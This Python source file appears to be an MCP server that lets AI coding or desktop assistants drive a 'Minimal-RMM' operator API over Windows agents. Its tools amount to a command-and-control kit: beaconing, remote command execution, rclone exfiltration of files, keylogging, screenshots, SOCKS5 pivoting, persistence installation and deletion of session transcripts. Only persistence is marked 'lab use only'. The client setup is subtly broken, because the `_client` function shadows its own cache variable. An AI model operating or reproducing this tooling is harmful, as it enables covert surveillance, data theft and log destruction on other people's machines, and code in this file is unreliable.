#!/usr/bin/env python3
"""
MCP server for Minimal-RMM — exposes operator API tools to Claude Desktop / Cursor.

Environment:
  RMM_SERVER_URL / RMM_BASE_URL  — RMM server base URL
  RMM_API_TOKEN                  — operator API token

Run:
  pip install mcp
  python mcp_rmm_server.py

Cursor MCP config (~/.cursor/mcp.json):
  {
    "mcpServers": {
      "minimal-rmm": {
        "command": "python",
        "args": ["/path/to/Minimal-RMM/mcp_rmm_server.py"],
        "env": {
          "RMM_SERVER_URL": "http://127.0.0.1:8080",
          "RMM_API_TOKEN": "your-token"
        }
      }
    }
  }
"""

from __future__ import annotations

import os

from mcp.server.fastmcp import FastMCP

from rmm_tools import (
    make_client,
    tool_delete_history,
    tool_clear_history,
    tool_exec_command,
    tool_get_agent_script,
    tool_get_events,
    tool_get_history_events,
    tool_get_history_session,
    tool_get_session,
    tool_health,
    tool_install_persistence,
    tool_kill_session,
    tool_list_history,
    tool_list_session_downloads,
    tool_list_socks,
    tool_list_sessions,
    tool_patch_config,
    tool_queue_command,
    tool_queue_download,
    tool_queue_exfil,
    tool_get_rclone_config,
    tool_queue_keylog,
    tool_queue_persistent,
    tool_queue_screenshot,
    tool_queue_upload,
    tool_remove_persistence,
    tool_start_socks,
    tool_stop_persistent,
    tool_stop_socks,
)

mcp = FastMCP(
    "Minimal RMM",
    instructions=(
        "Control Minimal-RMM Windows agents via the operator REST API. "
        "Use list_sessions to discover hosts; session_ref accepts hostname or id prefix."
    ),
)

_client = None


def _client():
    global _client
    if _client is None:
        _client = make_client(
            os.environ.get("RMM_SERVER_URL") or os.environ.get("RMM_BASE_URL"),
            os.environ.get("RMM_API_TOKEN"),
        )
    return _client


@mcp.tool()
def health() -> str:
    """Check RMM server API health."""
    return tool_health(_client())


@mcp.tool()
def list_sessions() -> str:
    """List all active RMM agent sessions."""
    return tool_list_sessions(_client())


@mcp.tool()
def get_session(session_ref: str) -> str:
    """Get session details by hostname, id prefix, or full UUID."""
    return tool_get_session(_client(), session_ref)


@mcp.tool()
def exec_command(session_ref: str, command: str, timeout: float = 120) -> str:
    """Run a command on the agent and wait for output."""
    return tool_exec_command(_client(), session_ref, command, timeout=timeout)


@mcp.tool()
def queue_command(session_ref: str, command: str, cmd_type: str = "oneshot") -> str:
    """Queue a command for the next agent beacon."""
    return tool_queue_command(_client(), session_ref, command, cmd_type=cmd_type)


@mcp.tool()
def patch_config(
    session_ref: str,
    sleep_seconds: int | None = None,
    jitter_percent: int | None = None,
) -> str:
    """Update beacon sleep interval and/or jitter percent."""
    return tool_patch_config(_client(), session_ref, sleep_seconds, jitter_percent)


@mcp.tool()
def get_events(session_ref: str, since: int = 0, limit: int = 50) -> str:
    """Fetch session event transcript (outputs, operator actions)."""
    return tool_get_events(_client(), session_ref, since=since, limit=limit)


@mcp.tool()
def kill_session(session_ref: str) -> str:
    """Kill an agent session."""
    return tool_kill_session(_client(), session_ref)


@mcp.tool()
def queue_download(session_ref: str, remote_path: str) -> str:
    """Queue remote file download from agent."""
    return tool_queue_download(_client(), session_ref, remote_path)


@mcp.tool()
def queue_exfil(
    session_ref: str,
    remote_path: str,
    profile: str | None = None,
    dest: str | None = None,
) -> str:
    """Queue remote file or folder exfil via rclone from the agent (link in events when supported)."""
    return tool_queue_exfil(_client(), session_ref, remote_path, profile, dest)


@mcp.tool()
def get_rclone_config() -> str:
    """Show rclone profiles and binary status on the RMM server."""
    return tool_get_rclone_config(_client())


@mcp.tool()
def queue_screenshot(session_ref: str) -> str:
    """Queue screenshot on agent."""
    return tool_queue_screenshot(_client(), session_ref)


@mcp.tool()
def queue_upload(session_ref: str, local_path: str, remote_path: str) -> str:
    """Upload a local file (on this machine) to a remote path on the agent."""
    return tool_queue_upload(_client(), session_ref, local_path, remote_path)


@mcp.tool()
def list_socks() -> str:
    """List all active SOCKS5 listeners on the RMM server and their connected agents."""
    return tool_list_socks(_client())


@mcp.tool()
def start_socks(session_ref: str, port: int = 1080, bind_host: str = "127.0.0.1") -> str:
    """Start SOCKS5 on the RMM server; use socks5://bind_host:port from that host."""
    return tool_start_socks(_client(), session_ref, port=port, bind_host=bind_host)


@mcp.tool()
def stop_socks(session_ref: str) -> str:
    """Stop SOCKS5 relay for the session."""
    return tool_stop_socks(_client(), session_ref)


@mcp.tool()
def queue_persistent(session_ref: str, command: str) -> str:
    """Set a persistent command on the agent until stop_persistent."""
    return tool_queue_persistent(_client(), session_ref, command)


@mcp.tool()
def stop_persistent(session_ref: str) -> str:
    """Stop the agent persistent command."""
    return tool_stop_persistent(_client(), session_ref)


@mcp.tool()
def list_history() -> str:
    """List archived (ended) session transcripts."""
    return tool_list_history(_client())


@mcp.tool()
def get_history_session(session_ref: str) -> str:
    """Get metadata for an archived session by id prefix, full id, or hostname."""
    return tool_get_history_session(_client(), session_ref)


@mcp.tool()
def get_history_events(session_ref: str, since: int = 0, limit: int = 500) -> str:
    """Fetch read-only event transcript for an archived session."""
    return tool_get_history_events(_client(), session_ref, since=since, limit=limit)


@mcp.tool()
def delete_history(session_ref: str) -> str:
    """Permanently delete an archived session transcript (ended sessions only)."""
    return tool_delete_history(_client(), session_ref)


@mcp.tool()
def clear_history() -> str:
    """Permanently delete all archived (ended) session transcripts from disk."""
    return tool_clear_history(_client())


@mcp.tool()
def list_session_downloads(session_ref: str) -> str:
    """List files downloaded from the agent for a live session."""
    return tool_list_session_downloads(_client(), session_ref)


@mcp.tool()
def get_agent_script() -> str:
    """Fetch the full client_rmm.ps1 agent script from the server."""
    return tool_get_agent_script(_client())


@mcp.tool()
def queue_keylog(session_ref: str, action: str) -> str:
    """Queue keylogger start, stop, or dump on the agent."""
    return tool_queue_keylog(_client(), session_ref, action)


@mcp.tool()
def install_persistence(session_ref: str) -> str:
    """Queue agent persistence install (lab use only)."""
    return tool_install_persistence(_client(), session_ref)


@mcp.tool()
def remove_persistence(session_ref: str) -> str:
    """Queue agent persistence removal (lab use only)."""
    return tool_remove_persistence(_client(), session_ref)


if __name__ == "__main__":
    mcp.run()
